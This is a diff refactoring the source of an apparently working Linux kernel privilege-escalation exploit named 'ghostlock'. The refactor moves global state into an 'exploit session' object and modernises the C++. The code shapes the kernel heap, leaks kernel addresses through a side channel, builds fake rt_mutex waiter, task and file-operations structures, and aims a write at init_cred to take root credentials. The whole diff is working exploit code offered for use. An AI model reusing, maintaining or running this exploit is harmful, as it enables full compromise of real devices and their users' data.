@@ -1,23 +1,24 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include "session/exploit_session.hpp"
 #include "support/native_resource.hpp"
 #include "target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
-#define ks (g_heap_context.snitch)
-#define mm_objs_per_slab (g_heap_context.mm_objs_per_slab)
-#define skb_buf (g_heap_context.skb_buffer.get())
-#define reclaim_sv (g_heap_context.current.reclaim.fd)
-#define prepare_ctx (g_heap_context.prepare)
-#define spray_ctx (g_heap_context.spray)
-#define pre_ctx (g_heap_context.pre)
-#define post_ctx (g_heap_context.post)
-#define child_leak (g_heap_context.leak_child)
+#define ks (g_exploit_session.heap.snitch)
+#define mm_objs_per_slab (g_exploit_session.heap.mm_objs_per_slab)
+#define skb_buf (g_exploit_session.heap.skb_buffer.get())
+#define reclaim_sv (g_exploit_session.heap.current.reclaim.fd)
+#define prepare_ctx (g_exploit_session.heap.prepare)
+#define spray_ctx (g_exploit_session.heap.spray)
+#define pre_ctx (g_exploit_session.heap.pre)
+#define post_ctx (g_exploit_session.heap.post)
+#define child_leak (g_exploit_session.heap.leak_child)
 
 namespace ghostlock::support {
 
 static const struct kernel_offsets *profile_values(void) {
-  return target_profile_values(&g_target_profile);
+  return target_profile_values(&g_exploit_session.profile);
 }
 
 /* Decoupling plan: compute elapsed monotonic time. Input: const reference
@@ -38,13 +39,13 @@ void log_sync(void) {
  * tcp_zerocopy_supports(profile, config), with no environment reread. */
 int tcp_route_selected(void) {
   return runtime_config_snapshot().tcp_zerocopy_enabled &&
-         target_profile_supports_tcp_zerocopy(&g_target_profile);
+         target_profile_supports_tcp_zerocopy(&g_exploit_session.profile);
 }
 
 /* Decoupling plan: report multicast-waiter capability. Input: profile; output:
  * boolean. Future: multicast_waiter_supports(const TargetProfile *). */
 int kernel5_route_selected(void) {
-  return target_profile_supports_multicast_waiter(&g_target_profile);
+  return target_profile_supports_multicast_waiter(&g_exploit_session.profile);
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -52,7 +53,7 @@ void read_first_line(const char *path, char *buf, size_t len) {
     return;
   }
   snprintf(buf, len, "unreadable");
-  ghostlock::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
+  UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
   if (!fd.valid()) {
     return;
   }
@@ -119,10 +120,10 @@ void log_startup_context(void) {
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)ghostlock::memory::resolved_addresses_kernel_phys_load(
-                 &g_resolved_addresses),
-             (unsigned long long)(ghostlock::memory::resolved_addresses_kernel_phys_load(
-                 &g_resolved_addresses) -
+             (unsigned long long)memory::resolved_addresses_kernel_phys_load(
+                 &g_exploit_session.addresses),
+             (unsigned long long)(memory::resolved_addresses_kernel_phys_load(
+                 &g_exploit_session.addresses) -
                                   P0_PHYS_OFFSET),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
@@ -159,10 +160,10 @@ long sched_setattr_tid(int tid, int nice_value) {
  * profile; output: ghostlock::memory::ResolvedAddresses. Future: resolve_runtime_addresses(). */
 void init_p0_profile(void) {
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
-          (unsigned long long)ghostlock::memory::resolved_addresses_kernel_phys_load(
-              &g_resolved_addresses),
-          (unsigned long long)(ghostlock::memory::resolved_addresses_kernel_phys_load(
-              &g_resolved_addresses) -
+          (unsigned long long)memory::resolved_addresses_kernel_phys_load(
+              &g_exploit_session.addresses),
+          (unsigned long long)(memory::resolved_addresses_kernel_phys_load(
+              &g_exploit_session.addresses) -
                                P0_PHYS_OFFSET));
 }
 
@@ -207,7 +208,7 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off) {
       return 0;
     }
     put64(c, ref_offsets[i],
-          ghostlock::memory::resolved_addresses_data_alias(&g_resolved_addresses, ref_images[i]));
+          memory::resolved_addresses_data_alias(&g_exploit_session.addresses, ref_images[i]));
   }
   return 1;
 }
@@ -215,7 +216,7 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off) {
 /* Decoupling plan: create an mm-allocation helper child. Input: heap context;
  * output: owned PID. Future: heap_context_spawn_mm_child(). */
 pid_t clone_child(void) {
-  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0));
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
     if (getppid() == 1) {
@@ -232,7 +233,7 @@ pid_t clone_child(void) {
 /* Decoupling plan: create and retain the leak helper child. Input/output: heap
  * context; output: owned PID. Future: heap_context_spawn_leak_child(). */
 pid_t clone_leak_child(void) {
-  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0));
   if (child == 0) {
     kernelsnitch_context_find_collisions(ks);
     exit(0);
@@ -255,69 +256,69 @@ void kill_child(pid_t child) {
     return;
   }
   SYSCHK(kill(child, SIGKILL));
-  SYSCHK(waitpid(child, NULL, 0));
+  SYSCHK(waitpid(child, nullptr, 0));
 }
 
 /* Decoupling plan: release the current reclaim socket pair. Input/output: heap
  * context. Future: reclaim_pair_destroy(ghostlock::memory::ReclaimPair *). */
 void close_reclaim_sockets(void) {
-  ghostlock::memory::payload_page_destroy(&g_heap_context.current);
+  memory::payload_page_destroy(&g_exploit_session.heap.current);
 }
 
 /* Decoupling plan: transfer current reclaim sockets into quarantine. Input:
  * heap context; output: transfer status. Future: reclaim_pair_quarantine(). */
 int quarantine_reclaim_sockets(void) {
-  return ghostlock::memory::payload_page_move(&g_heap_context.quarantine,
-                           &g_heap_context.current,
-                           ghostlock::memory::PAYLOAD_PAGE_QUARANTINED);
+  return memory::payload_page_move(&g_exploit_session.heap.quarantine,
+                           &g_exploit_session.heap.current,
+                           memory::PayloadPageState::Quarantined);
 }
 
 /* Decoupling plan: release all quarantined reclaim ownership. Input/output:
  * heap context. Future: heap_context_release_quarantine(). */
 void release_quarantined_reclaim_sockets(void) {
-  ghostlock::memory::payload_page_destroy(&g_heap_context.quarantine);
+  memory::payload_page_destroy(&g_exploit_session.heap.quarantine);
 }
 
 /* Decoupling plan: move the current payload page into the prebuilt slot. Input:
  * heap context; output: move status. Future: ghostlock::memory::payload_page_move(prebuilt,current). */
 int stash_prebuilt_page(void) {
-  return ghostlock::memory::payload_page_move(&g_heap_context.prebuilt,
-                           &g_heap_context.current,
-                           ghostlock::memory::PAYLOAD_PAGE_PREBUILT);
+  return memory::payload_page_move(&g_exploit_session.heap.prebuilt,
+                           &g_exploit_session.heap.current,
+                           memory::PayloadPageState::Prebuilt);
 }
 
 /* Decoupling plan: move the prebuilt page into the active slot. Input/output:
  * heap context; output: activation status. Future: heap_activate_prebuilt_page(). */
 int activate_prebuilt_page(void) {
-  if (!ghostlock::memory::payload_page_has_reclaim(&g_heap_context.prebuilt)) return 0;
+  if (!memory::payload_page_has_reclaim(&g_exploit_session.heap.prebuilt)) return 0;
   close_reclaim_sockets();
-  return ghostlock::memory::payload_page_move(&g_heap_context.current,
-                           &g_heap_context.prebuilt,
-                           ghostlock::memory::PAYLOAD_PAGE_CURRENT);
+  return memory::payload_page_move(&g_exploit_session.heap.current,
+                           &g_exploit_session.heap.prebuilt,
+                           memory::PayloadPageState::Current);
 }
 
 /* Decoupling plan: destroy the prebuilt page and its reclaim pair. Input/output:
  * heap context. Future: ghostlock::memory::payload_page_destroy(&context->prebuilt). */
 void discard_prebuilt_page(void) {
-  ghostlock::memory::payload_page_destroy(&g_heap_context.prebuilt);
+  memory::payload_page_destroy(&g_exploit_session.heap.prebuilt);
 }
 
 /* Decoupling plan: clean one heap-preparation attempt. Input: ghostlock::memory::HeapContext;
  * output: all attempt-owned resources released. Future:
  * heap_context_reset_attempt(), separate from route cleanup. */
 void cleanup_page_prepare_state(void) {
-  ghostlock::memory::close_ctx_memfds(&prepare_ctx);
-  ghostlock::memory::close_ctx_memfds(&spray_ctx);
-  ghostlock::memory::close_ctx_memfds(&pre_ctx);
-  ghostlock::memory::close_ctx_memfds(&post_ctx);
-  if (g_heap_context.leak_memfd.get() > 0) {
-    g_heap_context.leak_memfd.reset();
+  memory::close_ctx_memfds(&prepare_ctx);
+  memory::close_ctx_memfds(&spray_ctx);
+  memory::close_ctx_memfds(&pre_ctx);
+  memory::close_ctx_memfds(&post_ctx);
+  if (g_exploit_session.heap.leak_memfd.get() > 0) {
+    g_exploit_session.heap.leak_memfd.reset();
   }
-  ghostlock::memory::free_ctx_storage(&prepare_ctx);
-  ghostlock::memory::free_ctx_storage(&spray_ctx);
-  ghostlock::memory::free_ctx_storage(&pre_ctx);
-  ghostlock::memory::free_ctx_storage(&post_ctx);
-  g_heap_context.skb_buffer.reset();
+  memory::free_ctx_storage(&prepare_ctx);
+  memory::free_ctx_storage(&spray_ctx);
+  memory::free_ctx_storage(&pre_ctx);
+  memory::free_ctx_storage(&post_ctx);
+  g_exploit_session.heap.skb_buffer.reset();
 }
 
 /* Decoupling plan: create a helper child and associated memfd. Input/output:
@@ -359,25 +360,25 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
 
   uintptr_t payload_base = base + (uintptr_t) payload_delta;
 
-  (g_heap_context.current.fake_lock) = payload_base + LOCK_OFF;
-  (g_heap_context.current.fake_w0) = payload_base + W0_OFF;
-  (g_heap_context.current.fake_task) = payload_base + fake_task_off;
+  (g_exploit_session.heap.current.fake_lock) = payload_base + LOCK_OFF;
+  (g_exploit_session.heap.current.fake_w0) = payload_base + W0_OFF;
+  (g_exploit_session.heap.current.fake_task) = payload_base + fake_task_off;
   uintptr_t default_fops = payload_base + FOPS_TABLE_OFF;
   uintptr_t credential_fops =
       payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
   PayloadWriteLayout write_layout = payload_write_layout(
       request, base, default_fops, credential_fops,
-      ghostlock::memory::resolved_addresses_data_alias(&g_resolved_addresses,
-                                    ghostlock::memory::resolved_addresses_init_cred_image(
-                                        &g_resolved_addresses)));
-  (g_heap_context.current.fake_parent) = write_layout.parent;
-  (g_heap_context.current.fake_right) = write_layout.right;
-  (g_heap_context.current.fake_left) = write_layout.left;
-  (g_heap_context.current.fake_fops) = write_layout.fops;
+      memory::resolved_addresses_data_alias(&g_exploit_session.addresses,
+                                    memory::resolved_addresses_init_cred_image(
+                                        &g_exploit_session.addresses)));
+  (g_exploit_session.heap.current.fake_parent) = write_layout.parent;
+  (g_exploit_session.heap.current.fake_right) = write_layout.right;
+  (g_exploit_session.heap.current.fake_left) = write_layout.left;
+  (g_exploit_session.heap.current.fake_fops) = write_layout.fops;
 
-  uintptr_t write_pc = (g_heap_context.current.fake_parent);
-  uintptr_t write_right = (g_heap_context.current.fake_right);
-  uintptr_t write_left = (g_heap_context.current.fake_left);
+  uintptr_t write_pc = (g_exploit_session.heap.current.fake_parent);
+  uintptr_t write_right = (g_exploit_session.heap.current.fake_right);
+  uintptr_t write_left = (g_exploit_session.heap.current.fake_left);
   /* Direct-map aliases (data_addr) resolve to the same physical pages and are
    * dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK
    * the same way for the on-stack waiter (upstream U01-D). */
@@ -386,15 +387,15 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
   uint64_t pi_top_task = SLIDE_INIT_TASK;
 
   const struct kernel_offsets *v = profile_values();
-  int compact = target_profile_has_compact_waiter(&g_target_profile);
+  int compact = target_profile_has_compact_waiter(&g_exploit_session.profile);
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + chunk_bias;
 
     put32(p, LOCK_OFF + 0x00, 0);
-    put64(p, LOCK_OFF + 0x08, (g_heap_context.current.fake_w0));
-    put64(p, LOCK_OFF + 0x10, (g_heap_context.current.fake_w0));
-    put64(p, LOCK_OFF + 0x18, (g_heap_context.current.fake_task) | 1);
+    put64(p, LOCK_OFF + 0x08, (g_exploit_session.heap.current.fake_w0));
+    put64(p, LOCK_OFF + 0x10, (g_exploit_session.heap.current.fake_w0));
+    put64(p, LOCK_OFF + 0x18, (g_exploit_session.heap.current.fake_task) | 1);
 
     if (compact) {
       /* Words ride the erase relink: pc = value, rb_left = dest,
@@ -406,12 +407,12 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      (void) ghostlock::encode_compact_waiter(
+      (void) encode_compact_waiter(
           {reinterpret_cast<std::byte *>(p + W0_OFF),
-           ghostlock::kCompactWaiterBytes},
+           kCompactWaiterBytes},
           *request, write_layout);
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
-      put64(p, W0_OFF + 0x38, (g_heap_context.current.fake_lock));   /* lock */
+      put64(p, W0_OFF + 0x38, (g_exploit_session.heap.current.fake_lock));   /* lock */
       put32(p, W0_OFF + 0x40, 0);           /* wake_state */
       put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
       put64(p, W0_OFF + 0x48, 0);           /* deadline */
@@ -429,7 +430,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, (g_heap_context.current.fake_lock));
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, (g_exploit_session.heap.current.fake_lock));
       put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
     }
@@ -461,11 +462,11 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
     put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
     put64(p, fake_task_off + ft_pi_blocked_off, 0);
 
-    put64(p, RIGHT_OFF + 0x00, (g_heap_context.current.fake_parent));
+    put64(p, RIGHT_OFF + 0x00, (g_exploit_session.heap.current.fake_parent));
     put64(p, RIGHT_OFF + 0x08, 0);
     put64(p, RIGHT_OFF + 0x10, 0);
 
-    put64(p, LEFT_OFF + 0x00, (g_heap_context.current.fake_parent));
+    put64(p, LEFT_OFF + 0x00, (g_exploit_session.heap.current.fake_parent));
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
@@ -480,6 +481,10 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
 /* Decoupling plan: perform one complete heap-shaping/page-reclaim attempt.
  * Inputs: ghostlock::memory::HeapContext, profile and payload request; output: ghostlock::memory::PayloadPage/status.
  * Future: heap_context_prepare_payload_page(), with unique resource ownership. */
+/* TODO(CPP07-OWNER): partial prepare failure injection still needs a
+ * syscall-level fault-injection framework; the ownership refactor itself is
+ * complete (CPP12h). Completion: add the framework, cover the early-exit
+ * paths, then delete this comment and the residual row. */
 uintptr_t prepare_kernel_page(const WriteRequest *request) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
@@ -489,10 +494,10 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   close_reclaim_sockets();
   cleanup_page_prepare_state();
   mm_objs_per_slab = ORDER3_SIZE /
-          target_profile_mm_struct_sz(&g_target_profile, MM_STRUCT_SZ);
+          target_profile_mm_struct_sz(&g_exploit_session.profile, MM_STRUCT_SZ);
   prepare_ctxs();
 
-  g_heap_context.skb_buffer = std::make_unique<unsigned char[]>(SKB_SEND_SIZE);
+  g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
 
   for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
@@ -506,14 +511,14 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ghostlock::KernelSnitchOwner snitch = ghostlock::KernelSnitchOwner::create(
-      target_profile_mm_struct_sz(&g_target_profile, MM_STRUCT_SZ),
+  KernelSnitchOwner snitch = KernelSnitchOwner::create(
+      target_profile_mm_struct_sz(&g_exploit_session.profile, MM_STRUCT_SZ),
       MM_ORDER, (size_t) cpu_count, kernelsnitch_collisions(), 0,
       (size_t) runtime_config_snapshot().main_cpu);
   /* The forked leak child borrows the shared mmap context through this
    * compatibility alias; the owner remains the only releaser. */
   auto clear_snitch_alias =
-      ghostlock::make_scope_exit([]() noexcept { ks = NULL; });
+      make_scope_exit([]() noexcept { ks = nullptr; });
   ks = snitch.get();
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
@@ -521,7 +526,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
     pre_ctx.childs[i] = clone_child();
   }
-  child_leak = ghostlock::ChildProcess(clone_leak_child());
+  child_leak = ChildProcess(clone_leak_child());
   for (size_t i = 0; i < post_ctx.childs.size(); i++) {
     post_ctx.childs[i] = clone_child();
   }
@@ -529,7 +534,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
-  g_heap_context.leak_memfd.reset(open_memfd(child_leak.get()));
+  g_exploit_session.heap.leak_memfd.reset(open_memfd(child_leak.get()));
   for (size_t i = 0; i < post_ctx.childs.size(); i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
@@ -565,7 +570,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
       }
       long long waited = ms_since(&t_wait);
       uint32_t timeout_ms =
-          target_profile_execution(&g_target_profile)
+          target_profile_execution(&g_exploit_session.profile)
               ->heap_kernelsnitch_timeout_ms;
       if ((uint64_t)waited >= timeout_ms) {
         pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
@@ -610,7 +615,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   uintptr_t leaked = snitch.result();
   /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
   leaked |= (uintptr_t)0xf << 56;
-  (g_heap_context.current.last_mm_struct) = leaked;
+  (g_exploit_session.heap.current.last_mm_struct) = leaked;
   /* mm_structs live in the direct map */
   if (leaked == (uintptr_t)-1 ||
       leaked < KERNELSNITCH_IDENTITY_START ||
@@ -635,7 +640,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
-  g_heap_context.current.state = ghostlock::memory::PAYLOAD_PAGE_CURRENT;
+  g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
   int sndbuf = 1 << 20;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
@@ -681,8 +686,8 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   sched_yield();
   sched_yield();
   sched_yield();
-  SYSCHK_pr(close(g_heap_context.leak_memfd.release()), "SYSCHK(" "close(memfd_leak)" "): %m\n");
-  g_heap_context.leak_memfd.reset();
+  SYSCHK_pr(close(g_exploit_session.heap.leak_memfd.release()), "SYSCHK(" "close(memfd_leak)" "): %m\n");
+  g_exploit_session.heap.leak_memfd.reset();
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -707,7 +712,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
  * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
 uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
   const struct execution_settings *execution =
-      target_profile_execution(&g_target_profile);
+      target_profile_execution(&g_exploit_session.profile);
   int max_attempts = (int)execution->heap_prepare_max_attempts;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
@@ -724,10 +729,10 @@ uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
     uintptr_t base = prepare_kernel_page(request);
     if (base) {
       PayloadWriteLayout layout = {
-        .parent = (g_heap_context.current.fake_parent),
-        .right = (g_heap_context.current.fake_right),
-        .left = (g_heap_context.current.fake_left),
-        .fops = (g_heap_context.current.fake_fops),
+        .parent = (g_exploit_session.heap.current.fake_parent),
+        .right = (g_exploit_session.heap.current.fake_right),
+        .left = (g_exploit_session.heap.current.fake_left),
+        .fops = (g_exploit_session.heap.current.fake_fops),
       };
       if (!payload_write_layout_matches_request(request, &layout)) {
         pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
